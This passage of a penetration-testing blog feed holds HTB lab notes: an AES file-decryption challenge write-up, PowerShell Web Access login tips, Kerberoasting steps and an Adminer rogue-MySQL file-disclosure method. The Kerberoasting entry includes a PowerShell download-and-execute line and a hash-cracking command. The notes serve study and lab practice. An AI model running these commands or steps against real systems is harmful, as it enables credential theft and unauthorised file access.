<span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">infile</span><span class=\"p\">:</span>        <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">outputFile</span><span class=\"p\">,</span> <span class=\"s\">'wb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">outfile</span><span class=\"p\">:</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">filesize</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">IV</span><span class=\"p\">)</span>            <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>                <span class=\"n\">chunk</span> <span class=\"o\">=</span> <span class=\"n\">infile</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"n\">chunksize</span><span class=\"p\">)</span>                <span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"k\">break</span>                <span class=\"k\">elif</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"n\">chunk</span> <span class=\"o\">+=</span> <span class=\"sa\">b</span><span class=\"s\">' '</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span><span class=\"p\">))</span>                <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">encryptor</span><span class=\"p\">.</span><span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">))</span><span class=\"k\">def</span> <span class=\"nf\">getKey</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">):</span>            <span class=\"n\">hasher</span> <span class=\"o\">=</span> <span class=\"n\">SHA256</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"k\">return</span> <span class=\"n\">hasher</span><span class=\"p\">.</span><span class=\"n\">digest</span><span class=\"p\">()</span></code></pre></div></div><p>Obviously we need to modify this code to work properly. For example, the imports are missing. But before that, I tried to inspect the other attachment on how does it look like internally. I confirmed that the content is unreadable even when viewing in <code class=\"language-plaintext highlighter-rouge\">xxd</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>file enim_msg.txt enim_msg.txt: data<span class=\"nv\">$ </span>strings enim_msg.txt 0000000000000234YDo!<span class=\"nv\">$ </span></code></pre></div></div><p>Going back to the python code above, by doing static analysis, I can confirm that it accepts an input <code class=\"language-plaintext highlighter-rouge\">password</code>, then that password is turned into a SHA256 hash, then the hashed password is used as a key for AES CBC mode. The encryption is also done in 65536 bytes chunk as per <code class=\"language-plaintext highlighter-rouge\">chunksize = 64*1024</code> and put it into a file. At the beginning of the encrypted file, the program also put first the filesize with 0 paddings and IV, not sure though what’s the purpose of this.</p><p>I wanted to confirm my anlysis above so I modified the code and test by encrypting a file. The completed code now looks like:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">sys</span><span class=\"p\">,</span> <span class=\"n\">os</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Hash</span> <span class=\"kn\">import</span> <span class=\"n\">SHA256</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto</span> <span class=\"kn\">import</span> <span class=\"n\">Random</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Cipher</span> <span class=\"kn\">import</span> <span class=\"n\">AES</span><span class=\"n\">PASSWORD</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"n\">FILENAME</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"k\">def</span> <span class=\"nf\">encrypt</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">filename</span><span class=\"p\">):</span>    <span class=\"n\">chunksize</span> <span class=\"o\">=</span> <span class=\"mi\">64</span><span class=\"o\">*</span><span class=\"mi\">1024</span>    <span class=\"n\">outputFile</span> <span class=\"o\">=</span> <span class=\"s\">\"en\"</span> <span class=\"o\">+</span> <span class=\"n\">filename</span>    <span class=\"n\">filesize</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">getsize</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">)).</span><span class=\"n\">zfill</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"n\">IV</span> <span class=\"o\">=</span><span class=\"n\">Random</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">().</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">IV</span><span class=\"p\">)</span>    <span class=\"n\">encryptor</span> <span class=\"o\">=</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">MODE_CBC</span><span class=\"p\">,</span> <span class=\"n\">IV</span><span class=\"p\">)</span>    <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">infile</span><span class=\"p\">:</span>        <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">outputFile</span><span class=\"p\">,</span> <span class=\"s\">'wb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">outfile</span><span class=\"p\">:</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">filesize</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">IV</span><span class=\"p\">)</span>            <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>                <span class=\"n\">chunk</span> <span class=\"o\">=</span> <span class=\"n\">infile</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"n\">chunksize</span><span class=\"p\">)</span>                <span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"k\">break</span>                <span class=\"k\">elif</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"n\">chunk</span> <span class=\"o\">+=</span> <span class=\"sa\">b</span><span class=\"s\">' '</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span><span class=\"p\">))</span>                <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">encryptor</span><span class=\"p\">.</span><span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">))</span><span class=\"k\">def</span> <span class=\"nf\">getKey</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">):</span>            <span class=\"n\">hasher</span> <span class=\"o\">=</span> <span class=\"n\">SHA256</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"k\">return</span> <span class=\"n\">hasher</span><span class=\"p\">.</span><span class=\"n\">digest</span><span class=\"p\">()</span><span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">getKey</span><span class=\"p\">(</span><span class=\"n\">PASSWORD</span><span class=\"p\">),</span> <span class=\"n\">FILENAME</span><span class=\"p\">)</span></code></pre></div></div><p>I tried to create a test file, encrypt it using the new code, and compared the  encrypted file to the mail attachment.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># create test file</span><span class=\"nb\">echo </span>hello <span class=\"o\">&gt;</span> test.txt<span class=\"c\"># encrypt file using new code</span>./en.py pass123 test.txt<span class=\"c\"># compare encrypted file to the encrypted attachment</span><span class=\"nv\">$ </span>strings enim_msg.txt 0000000000000234YDo!<span class=\"nv\">$ </span>strings entest.txt 0000000000000006<span class=\"nv\">$ </span></code></pre></div></div><p>There is a slight difference, I only see the filesize with paddings on the strings output. But anyway, looks like we are on correct track.</p><p>The next step I decided is to start building the decryption program based from the encryption program. Its almost similar to the encryption program with few differences:</p><ul>  <li>Use <code class=\"language-plaintext highlighter-rouge\">decryptor.decrypt</code> instead of <code class=\"language-plaintext highlighter-rouge\">decryptor.encrypt</code></li>  <li>I removed the writing of IV and filesize with padding on the output file</li>  <li>Some variable changes</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">sys</span><span class=\"p\">,</span> <span class=\"n\">os</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Hash</span> <span class=\"kn\">import</span> <span class=\"n\">SHA256</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto</span> <span class=\"kn\">import</span> <span class=\"n\">Random</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Cipher</span> <span class=\"kn\">import</span> <span class=\"n\">AES</span><span class=\"n\">PASSWORD</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"n\">FILENAME</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"k\">def</span> <span class=\"nf\">decrypt</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">filename</span><span class=\"p\">):</span>  <span class=\"n\">chunksize</span> <span class=\"o\">=</span> <span class=\"mi\">64</span><span class=\"o\">*</span><span class=\"mi\">1024</span>  <span class=\"n\">outputFile</span> <span class=\"o\">=</span> <span class=\"s\">\"de\"</span> <span class=\"o\">+</span> <span class=\"n\">filename</span>   <span class=\"n\">filesize</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">getsize</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">)).</span><span class=\"n\">zfill</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>  <span class=\"n\">IV</span> <span class=\"o\">=</span><span class=\"n\">Random</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">().</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>  <span class=\"n\">decryptor</span> <span class=\"o\">=</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">MODE_CBC</span><span class=\"p\">,</span> <span class=\"n\">IV</span><span class=\"p\">)</span>  <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">infile</span><span class=\"p\">:</span>    <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">outputFile</span><span class=\"p\">,</span> <span class=\"s\">'wb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">outfile</span><span class=\"p\">:</span>      <span class=\"c1\"># outfile.write(filesize.encode('utf-8'))</span>      <span class=\"c1\"># outfile.write(IV)</span>      <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>        <span class=\"n\">chunk</span> <span class=\"o\">=</span> <span class=\"n\">infile</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"n\">chunksize</span><span class=\"p\">)</span>        <span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">:</span>            <span class=\"k\">break</span>        <span class=\"k\">elif</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">:</span>            <span class=\"n\">chunk</span> <span class=\"o\">+=</span> <span class=\"sa\">b</span><span class=\"s\">' '</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span><span class=\"p\">))</span>        <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">decryptor</span><span class=\"p\">.</span><span class=\"n\">decrypt</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">))</span>              <span class=\"k\">def</span> <span class=\"nf\">getKey</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">):</span>  <span class=\"n\">hasher</span> <span class=\"o\">=</span> <span class=\"n\">SHA256</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>  <span class=\"k\">return</span> <span class=\"n\">hasher</span><span class=\"p\">.</span><span class=\"n\">digest</span><span class=\"p\">()</span><span class=\"n\">decrypt</span><span class=\"p\">(</span><span class=\"n\">getKey</span><span class=\"p\">(</span><span class=\"n\">PASSWORD</span><span class=\"p\">),</span> <span class=\"n\">FILENAME</span><span class=\"p\">)</span></code></pre></div></div><p>I tried to run this against the decrypted test file I created and I was able to get the original data.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./de.py pass123 entest.txt  <span class=\"nv\">$ </span><span class=\"nb\">cat </span>deentest.txtk�Y���W3�B<span class=\"o\">}</span>���s�H                 <span class=\"o\">{</span>P��O<span class=\"k\">*</span>:hello          %                                                                                                  <span class=\"nv\">$ </span><span class=\"nv\">$ </span>strings deentest.txt            O<span class=\"k\">*</span>:hello          <span class=\"nv\">$ </span></code></pre></div></div><p>I was able to see the original data but there is some garbage. I’m sure I needed to do some changes on the decryption program but not sure on what part.</p><p>Having this problem, I tried first to use the decryption program against the encrypted attachment. Luckily, I know the password used because it was mentioned on the email body - it was same as the name of the recipient which is <code class=\"language-plaintext highlighter-rouge\">sahay</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./de.py sahay enim_msg.txt<span class=\"nv\">$ </span>strings deenim_msg.txt            sLPOSGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK      <span class=\"nv\">$ </span></code></pre></div></div><p>Doing a quick look at cyberchef using magic recipe, this is what I uncovered.</p><p><img src=\"/spindel/assets/Python%20AES%20Encryption%20and%20Decryption/8A8834E6-036B-479A-8BCA-BBB1DFD64A85.png\" alt=\"\" /></p><h2 id=\"better-solution\">Better solution</h2><p>I checked how different people did it. Here is from the official HTB walkthrough.</p><p><img src=\"/spindel/assets/Python%20AES%20Encryption%20and%20Decryption/798360A3-0518-4977-BF0E-A9AC702A25F2.png\" alt=\"\" /></p><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://raw.githubusercontent.com/mohamed1lar/Python-Scripts/master/crypto.py\">Looks like this is the original code where the program was based on</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/12/python-aes-encryption-and-decryption",
            
            
            
            "tags": ["python","crypto"],
            
            "date_published": "2022-04-12T00:00:00+08:00",
            "date_modified": "2022-04-12T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/10/powershell-web-access",
            "title": "Powershell Web Access",
            "summary": "Powershell Web Access",
            "content_text": "OverviewWeb-based powershell consoleInteresting URL Paths# login/remoteLogging in as local accountPrepend \\ or .\\ to be treated as local account instead of domain account.Or you can also use COMPUTER_NAME\\USER_NAME format.References  HTB Giddy",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Web-based powershell console</p><p><img src=\"/spindel/assets/Powershell%20Web%20Access/F6375AEF-BA00-4D83-9547-EB1F0F49D9E4.png\" alt=\"\" /></p><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># login</span><span class=\"w\"></span><span class=\"n\">/remote</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"logging-in-as-local-account\">Logging in as local account</h2><p>Prepend <code class=\"language-plaintext highlighter-rouge\">\\</code> or <code class=\"language-plaintext highlighter-rouge\">.\\</code> to be treated as local account instead of domain account.</p><p><img src=\"/spindel/assets/Powershell%20Web%20Access/935C5BE2-2EE2-47FA-B462-203F32529863.png\" alt=\"\" /></p><p>Or you can also use <code class=\"language-plaintext highlighter-rouge\">COMPUTER_NAME\\USER_NAME</code> format.</p><h2 id=\"references\">References</h2><ul>  <li>HTB Giddy</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/10/powershell-web-access",
            
            
            
            "tags": ["enum","windows","powershell","web"],
            
            "date_published": "2022-04-10T00:00:00+08:00",
            "date_modified": "2022-04-10T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/09/kerberoasting-using-powershell",
            "title": "Kerberoasting using Powershell",
            "summary": "Kerberoasting using Powershell",
            "content_text": "OverviewThis will request a service ticket for an account and acquire a hash using powershell.Requirement  You have access to the victim’s windows machine  Powershell is installedSteps  Extract SPNs (mapping between service and account)setspn -T medin -Q */*  Get powershell scriptiex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')  Run script and copy hash to attacker’s machineInvoke-Kerberoast -OutputFormat hashcat |fl  Sample output  Crack hash using hashcat (mode kerberos 5 TGS-REP etype 23)hashcat -m 13100 - a 0 hash.txt wordlist --forceAlternative  Kerberoasting - Red Teaming Experiments",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>This will request a service ticket for an account and acquire a hash using powershell.</p><h2 id=\"requirement\">Requirement</h2><ul>  <li>You have access to the victim’s windows machine</li>  <li>Powershell is installed</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Extract SPNs (mapping between service and account)</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">setspn</span><span class=\"w\"> </span><span class=\"nt\">-T</span><span class=\"w\"> </span><span class=\"nx\">medin</span><span class=\"w\"> </span><span class=\"nt\">-Q</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"nx\">/</span><span class=\"o\">*</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Get powershell script</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">iex</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"n\">New-Object</span><span class=\"w\"> </span><span class=\"nx\">Net.WebClient</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"nf\">DownloadString</span><span class=\"p\">(</span><span class=\"s1\">'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'</span><span class=\"p\">)</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Run script and copy hash to attacker’s machine</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Invoke-Kerberoast</span><span class=\"w\"> </span><span class=\"nt\">-OutputFormat</span><span class=\"w\"> </span><span class=\"nx\">hashcat</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"n\">fl</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Sample output</li></ul><p><img src=\"/spindel/assets/Kerberoasting%20using%20Powershell/X2lGkzF.png\" alt=\"\" /></p><ul>  <li>Crack hash using hashcat (mode kerberos 5 TGS-REP etype 23)</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>hashcat <span class=\"nt\">-m</span> 13100 - a 0 hash.txt wordlist <span class=\"nt\">--force</span></code></pre></div></div><h2 id=\"alternative\">Alternative</h2><ul>  <li><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting\">Kerberoasting - Red Teaming Experiments</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/09/kerberoasting-using-powershell",
            
            
            
            "tags": ["foothold","windows","ad","kerberos","powershell"],
            
            "date_published": "2022-04-09T00:00:00+08:00",
            "date_modified": "2022-04-09T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
            "title": "Adminer File Disclosure",
            "summary": "Adminer File Disclosure",
            "content_text": "OverviewAttacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.Protocol Flaw in MySQL  The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)Steps  Update rogue_mysql_server.py with the file you want to read and run itcd ~/data/toolscat rogue_mysql_server.py | egrep 'filename ='python2 rogue_mysql_server.py  Open wireshark and filter mysql packets  Login to adminer and point it to attacker rogue mysql. The rest can be any value.  Go back to wire shark and check the mysql response from victim.References  PHP tool ‘Adminer’ leaks passwords – Sansec  Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit  Alternative to the above - much easier to use",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>Attacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.</p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EF3B2DBA-F55A-487A-A698-BB47C683143C.png\" alt=\"\" /></p><h1 id=\"protocol-flaw-in-mysql\">Protocol Flaw in MySQL</h1><blockquote>  <p>The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)</p></blockquote><h1 id=\"steps\">Steps</h1><ul>  <li>Update <code class=\"language-plaintext highlighter-rouge\">rogue_mysql_server.py</code> with the file you want to read and run it</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cd</span> ~/data/tools<span class=\"nb\">cat </span>rogue_mysql_server.py | egrep <span class=\"s1\">'filename ='</span>python2 rogue_mysql_server.py</code></pre></div></div><ul>  <li>Open wireshark and filter mysql packets</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EA76910F-225D-4CD4-AA58-A0B7B73F1FFC.png\" alt=\"\" /></p><ul>  <li>Login to adminer and point it to attacker rogue mysql. The rest can be any value.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/2C2CD67E-0CD7-40AC-B898-E61DEF389D83.png\" alt=\"\" /></p><ul>  <li>Go back to wire shark and check the mysql response from victim.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0EE58AEE-B02F-4189-8DCF-96A72324C37B.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0B1373DE-095F-440A-ACBF-62BC821E42DC.png\" alt=\"\" /></p><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability\">PHP tool ‘Adminer’ leaks passwords – Sansec</a></li>  <li><a href=\"https://www.exploit-db.com/exploits/43593\">Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit</a></li>  <li><a href=\"https://podalirius.net/en/cves/2021-xxxxx/\">Alternative to the above</a> - much easier to use</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
            
            
            
            "tags": ["lfi","enum","foothold"],
            
            "date_published": "2022-04-08T00:00:00+08:00",
            "date_modified": "2022-04-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}